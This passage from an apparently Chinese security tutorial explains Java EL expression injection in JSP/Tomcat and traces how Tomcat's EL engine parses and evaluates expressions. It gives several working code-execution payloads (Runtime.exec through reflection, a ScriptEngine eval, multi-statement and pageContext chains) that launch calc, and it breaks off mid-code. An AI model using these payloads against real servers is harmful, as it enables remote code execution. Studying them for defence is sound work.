  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 <code>web.xml</code> 中添加如下内容可以让 JSP 编译出来的 Java 代码以文件形式保存。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- src/main/webapp/WEB-INF/web.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>development<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>keepgenerated<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>mappedFile<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>classdebuginfo<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>suppressSmap<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>dumpSmap<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 与 maven-compiler 对齐 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>compilerSourceVM<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>compilerTargetVM<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>3<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jspx<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="表达式特性"><a href="#表达式特性" class="headerlink" title="表达式特性"></a>表达式特性</h2><h3 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h3><p>EL 表达式注入比 SpEL 表达式注入复杂一点，例如不能通过 new 创建对象：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，要创建一个对象，只能通过无需 new 对象就能调用的方法，例如 <code>static</code> 修饰的方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Runtime.getRuntime.exec(<span class="string">&quot;calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在 EL 3.0 中，解析标识符时会有一个 <strong>ImportHandler</strong>（类型导入器）。它通常<strong>默认导入 <code>java.lang.*</code><strong>，因此像 <code>Class</code>、<code>String</code>、<code>Integer</code> 这类</strong>简单类名</strong>可以被识别为<strong>类型名</strong>（在某些上下文：例如构造器调用、静态访问的实现支持下）。</p>
</blockquote>
<p>高版本会有如下报错：</p>
<blockquote>
<p>javax.el.PropertyNotFoundException: No public static field named [getRuntime] was found on (exported for Java 9+) class [java.lang.Runtime]</p>
</blockquote>
<p>或者<strong>直接用反射就能够获取对象</strong>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, Class.forName(<span class="string">&quot;java.lang.String&quot;</span>)).invoke(</span><br><span class="line">        Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(</span><br><span class="line">            <span class="literal">null</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;calc&quot;</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>EL 里没有 Java 的“类字面量”语法</strong>，所以 <code>String.class</code> 这种 Java 写法在 EL 里不成立；而 <code>Class.forName(...)</code> 是<strong>普通静态方法调用</strong>，在支持 EL 3.0 的容器里（带有 ImportHandler 的类型解析），<code>Class</code> 会被解析为 <code>java.lang.Class</code>，因此能直接用。</p>
</blockquote>
<h3 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h3><p>例如下面这段 Java 代码执行会报错：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这是因为 Java 在编译字节码的时候无法判断 <code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance()</code> 反射创建的 <code>ScriptEngineManager</code> 对象的类型，因此不确定是否有 <code>getEngineByName</code> 方法。因此我们需要先强转成 <code>ScriptEngineManager</code> 类型才能使用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((ScriptEngineManager)<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance()).getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>而 EL 表达式在执行时，每一步函数调用都会通过反射去实现。在反射的过程中确定具体的类型， 所以不需要强制类型转换：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="多语句执行"><a href="#多语句执行" class="headerlink" title="多语句执行"></a>多语句执行</h3><p><strong>EL 3.0+（JSP 2.3 &#x2F; Servlet 3.1，典型是 Tomcat 8+）</strong>支持用分号 <code>;</code> 把多个表达式串起来，按<strong>从左到右</strong>执行，整个块的<strong>返回值是最后一个表达式</strong>的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123; </span><br><span class="line">    r=<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>);</span><br><span class="line">    rt=r.getMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">    rt.exec(<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line">   <span class="string">&#x27;ok&#x27;</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外多条语句还可以放到多个 EL 表达式块中，并且可以看出来变量赋值是可以跨标签的，也就是变量会写入上下文，并且由解析器维护。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;r=<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)&#125;</span><br><span class="line">$&#123;rt=r.getMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(<span class="literal">null</span>)&#125;</span><br><span class="line">$&#123;rt.exec(<span class="string">&#x27;calc&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></div>

<p>不过一般 EL 表达式注入不直接写赋值表达式从而保存在上下文中，而是直接调用上下文的 getter 和 setter：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;r&quot;</span>, <span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;rt&quot;</span>, pageContext.getAttribute(<span class="string">&quot;r&quot;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(<span class="literal">null</span>))&#125;</span><br><span class="line">$&#123;pageContext.getAttribute(<span class="string">&quot;rt&quot;</span>).exec(<span class="string">&#x27;calc&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="代码执行分析"><a href="#代码执行分析" class="headerlink" title="代码执行分析"></a>代码执行分析</h2><h3 id="表达式解析"><a href="#表达式解析" class="headerlink" title="表达式解析"></a>表达式解析</h3><h4 id="PageContextImpl-proprietaryEvaluate"><a href="#PageContextImpl-proprietaryEvaluate" class="headerlink" title="PageContextImpl#proprietaryEvaluate"></a>PageContextImpl#proprietaryEvaluate</h4><p>首先 <code>org.apache.jasper.runtime.PageContextImpl#proprietaryEvaluate</code> 函数是 apache 对 EL 表达式的调用的标准过程的一个封装：</p>
<ol>
<li>分别获取了解析 EL 表达式的 <code>ExpressionFactory</code>、<code>ELContext</code>、<code>ProtectedFunctionMapper</code>。<ul>
<li><code>ExpressionFactory</code>：把字符串解析成 <code>ValueExpression/MethodExpression</code>；</li>
<li><code>ELContext</code>：携带 <strong>ELResolver 链</strong>、<strong>类型转换</strong>、<strong>Function&#x2F;Variable Mapper</strong>；</li>
<li><code>ProtectedFunctionMapper</code>：JSTL&#x2F;标签库暴露的函数（<code>fn:...</code>），安装到 <code>ELContextImpl</code> 里；</li>
</ul>
</li>
<li>调用 <code>ExpressionFactory#createValueExpression</code> 根据 <code>ELContext</code> 和传入的 EL 表达式创建 <code>ValueExpression</code>，内部会用解析器把表达式变成 <strong><code>node</code>（语法树根）</strong>。</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 私有的/专用的 EL 表达式求值方法。</span></span><br><span class="line"><span class="comment"> * XXX：一旦 EL 解释器从 JSTL 中拆分成独立项目，这个方法应当被移除。</span></span><br><span class="line"><span class="comment"> * 目前保留它，是因为标准机制在某些场景下过慢，这里走一条更直接的“快路径”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> expression    需要求值的 EL 表达式（例如 &quot;$&#123;user.name&#125;&quot;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> expectedType  期望的返回类型（用于类型安全转换）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> pageContext   JSP 的 PageContext，承载 EL 上下文、应用上下文等</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> functionMap   自定义函数映射（前缀+函数名 -&gt; Method），用于在 EL 中调用函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>              表达式求值后的结果对象（类型与 expectedType 一致/可转换）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ELException  求值过程中发生解析/执行错误时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">proprietaryEvaluate</span><span class="params">(<span class="keyword">final</span> String expression,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Class&lt;?&gt; expectedType, <span class="keyword">final</span> PageContext pageContext,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> ProtectedFunctionMapper functionMap)</span></span><br><span class="line">        <span class="keyword">throws</span> ELException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 JSP 应用上下文中获取 ExpressionFactory（EL 工厂），</span></span><br><span class="line">    <span class="comment">// 由容器提供，用于创建 ValueExpression/MethodExpression 等。</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ExpressionFactory</span> <span class="variable">exprFactory</span> <span class="operator">=</span></span><br><span class="line">        jspf.getJspApplicationContext(pageContext.getServletContext())</span><br><span class="line">            .getExpressionFactory();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 PageContext 取出当前请求关联的 ELContext（表达式求值上下文），</span></span><br><span class="line">    <span class="comment">// 内含变量解析器、函数映射、类型转换器等。</span></span><br><span class="line">    <span class="type">ELContext</span> <span class="variable">ctx</span> <span class="operator">=</span> pageContext.getELContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里需要拿到具体的实现类 ELContextImpl，以便设置函数映射（FunctionMapper）。</span></span><br><span class="line">    ELContextImpl ctxImpl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 某些容器会用 ELContextWrapper 包一层，这里先解包拿到真正的 ELContextImpl。</span></span><br><span class="line">    <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> ELContextWrapper) &#123;</span><br><span class="line">        ctxImpl = (ELContextImpl) ((ELContextWrapper) ctx).getWrappedELContext();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则，ELContext 本身就是 ELContextImpl，直接强转。</span></span><br><span class="line">        ctxImpl = (ELContextImpl) ctx;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将调用方传入的函数映射安装到当前 EL 上下文，</span></span><br><span class="line">    <span class="comment">// 这样表达式中诸如 fn:xxx() 之类的函数才可被正确解析与调用。</span></span><br><span class="line">    ctxImpl.setFunctionMapper(functionMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过工厂创建一个“值表达式”（ValueExpression），</span></span><br><span class="line">    <span class="comment">// 绑定到当前 EL 上下文，并声明期望的返回类型 expectedType，</span></span><br><span class="line">    <span class="comment">// 容器会按该类型进行转换（必要时）。</span></span><br><span class="line">    <span class="type">ValueExpression</span> <span class="variable">ve</span> <span class="operator">=</span></span><br><span class="line">        exprFactory.createValueExpression(ctx, expression, expectedType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行表达式求值并返回结果。</span></span><br><span class="line">    <span class="comment">// 注意：求值时会用到上面设置好的 FunctionMapper、VariableMapper 等上下文信息。</span></span><br><span class="line">    <span class="keyword">return</span> ve.getValue(ctx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createValueExpression</code> 解析传入的 EL 表达式的值得到的 <code>ValueExpression</code> 结构如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ve = &#123;ValueExpressionImpl@7144&#125; &quot;ValueExpression[$&#123;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;)&#125;]&quot;</span><br><span class="line"> expectedType = &#123;Class@339&#125; &quot;class java.lang.String&quot;</span><br><span class="line"> expr = &quot;$&#123;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;)&#125;&quot;</span><br><span class="line"> fnMapper = null</span><br><span class="line"> varMapper = null</span><br><span class="line"> node = &#123;AstValue@7797&#125; &quot;Value&quot;</span><br><span class="line">  parent = &#123;AstDynamicExpression@7799&#125; &quot;DynamicExpression&quot;</span><br><span class="line">  children = &#123;SimpleNode[11]@7800&#125; </span><br><span class="line">   0 = &#123;AstString@7802&#125; &quot;String[&quot;&quot;]&quot;</span><br><span class="line">   1 = &#123;AstDotSuffix@7803&#125; &quot;DotSuffix[getClass]&quot;</span><br><span class="line">   2 = &#123;AstMethodParameters@7804&#125; &quot;()&quot;</span><br><span class="line">   3 = &#123;AstDotSuffix@7805&#125; &quot;DotSuffix[forName]&quot;</span><br><span class="line">   4 = &#123;AstMethodParameters@7806&#125; &quot;(String[&quot;javax.script.ScriptEngineManager&quot;],)&quot;</span><br><span class="line">   5 = &#123;AstDotSuffix@7807&#125; &quot;DotSuffix[newInstance]&quot;</span><br><span class="line">   6 = &#123;AstMethodParameters@7808&#125; &quot;()&quot;</span><br><span class="line">   7 = &#123;AstDotSuffix@7809&#125; &quot;DotSuffix[getEngineByName]&quot;</span><br><span class="line">   8 = &#123;AstMethodParameters@7810&#125; &quot;(String[&quot;js&quot;],)&quot;</span><br><span class="line">   9 = &#123;AstDotSuffix@7811&#125; &quot;DotSuffix[eval]&quot;</span><br><span class="line">   10 = &#123;AstMethodParameters@7812&#125; &quot;(String[&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;],)&quot;</span><br><span class="line">  id = 27</span><br><span class="line">  image = null</span><br></pre></td></tr></table></figure></div>

<h4 id="ValueExpressionImpl-getValue"><a href="#ValueExpressionImpl-getValue" class="headerlink" title="ValueExpressionImpl#getValue"></a>ValueExpressionImpl#getValue</h4><p><code>proprietaryEvaluate#</code>最后调用 <code>org.apache.el.ValueExpressionImpl#getValue</code> 计算表达式的结果并返回。这里实际上调用的是 <code>ValueExpressionImpl#node</code> 的 <code>getValue</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 计算（求值）当前 EL 表达式，并按需要把结果转换成期望类型。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义要点：</span></span><br><span class="line"><span class="comment"> * 1) 在真实求值前后，会通过 ELContext 发出通知回调（before/after），便于容器做日志、监控等。</span></span><br><span class="line"><span class="comment"> * 2) 真正的求值由语法树根节点 node 完成（node.getValue(ctx)），它会沿用 ELResolver 链解析属性/方法/索引/函数。</span></span><br><span class="line"><span class="comment"> * 3) 如果调用方声明了期望类型 expectedType，结果会通过 ELContext 的类型转换器做转换（可能触发自定义 Converter）。</span></span><br><span class="line"><span class="comment"> * 4) 解析过程中若出现“无法解析的属性/方法”等问题，由下层抛出 PropertyNotFoundException 或 ELException 向上冒泡。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">(ELContext context)</span> <span class="keyword">throws</span> PropertyNotFoundException, ELException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 1) 构造“求值用”的临时上下文 EvaluationContext ——</span></span><br><span class="line">    <span class="comment">// 它把外部的 ELContext（含 ELResolver、类型转换、变量/函数环境等）与</span></span><br><span class="line">    <span class="comment">// 当前表达式捕获的函数映射(fnMapper)与变量映射(varMapper)组装在一起，</span></span><br><span class="line">    <span class="comment">// 供语法树节点在递归求值时统一访问。</span></span><br><span class="line">    <span class="type">EvaluationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvaluationContext</span>(context, <span class="built_in">this</span>.fnMapper, <span class="built_in">this</span>.varMapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 2) 求值前通知：告知容器“马上要计算哪条表达式字符串” ——</span></span><br><span class="line">    <span class="comment">// 容器/框架可以在这里做 AOP 统计、调试记录、甚至短路等。</span></span><br><span class="line">    context.notifyBeforeEvaluation(getExpressionString());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 3) 真正求值：从语法树根节点出发，结合 ctx 逐步解析出一个 Object 结果 ——</span></span><br><span class="line">    <span class="comment">// 这里会依次触发：</span></span><br><span class="line">    <span class="comment">//   - 变量解析（VariableMapper / ScopedAttribute）</span></span><br><span class="line">    <span class="comment">//   - 属性读取（Bean/Map/List/Array 等 ELResolver 分支）</span></span><br><span class="line">    <span class="comment">//   - 方法调用（EL 3.0 起支持，走 resolver.invoke）</span></span><br><span class="line">    <span class="comment">//   - 索引访问、函数调用、Lambda 计算等</span></span><br><span class="line">    <span class="comment">// 任何一步失败（例如属性不存在、方法签名不匹配）都可能抛出 PropertyNotFoundException/ELException。</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getNode().getValue(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 4) 可选的类型转换：把结果转换为调用方声明的 expectedType ——</span></span><br><span class="line">    <span class="comment">// 若 expectedType 为 null，则直接返回原值；</span></span><br><span class="line">    <span class="comment">// 否则委托 ELContext.convertToType(...) 执行转换：</span></span><br><span class="line">    <span class="comment">//   - 基本包装类型（String → Integer/Boolean/...）</span></span><br><span class="line">    <span class="comment">//   - 日期/数字格式化</span></span><br><span class="line">    <span class="comment">//   - 自定义 Converter（若容器提供）</span></span><br><span class="line">    <span class="comment">// 注意：若 value 为 null 且 expectedType 是原始类型（如 int.class），</span></span><br><span class="line">    <span class="comment">//       转换器实现可能抛出 ELException 或返回默认值，取决于容器的策略。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.expectedType != <span class="literal">null</span>) &#123;</span><br><span class="line">        value = context.convertToType(value, <span class="built_in">this</span>.expectedType);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 5) 求值后通知：告知容器“表达式计算已完成” ——</span></span><br><span class="line">    <span class="comment">// 常用于清理 ThreadLocal、打印收尾日志等。</span></span><br><span class="line">    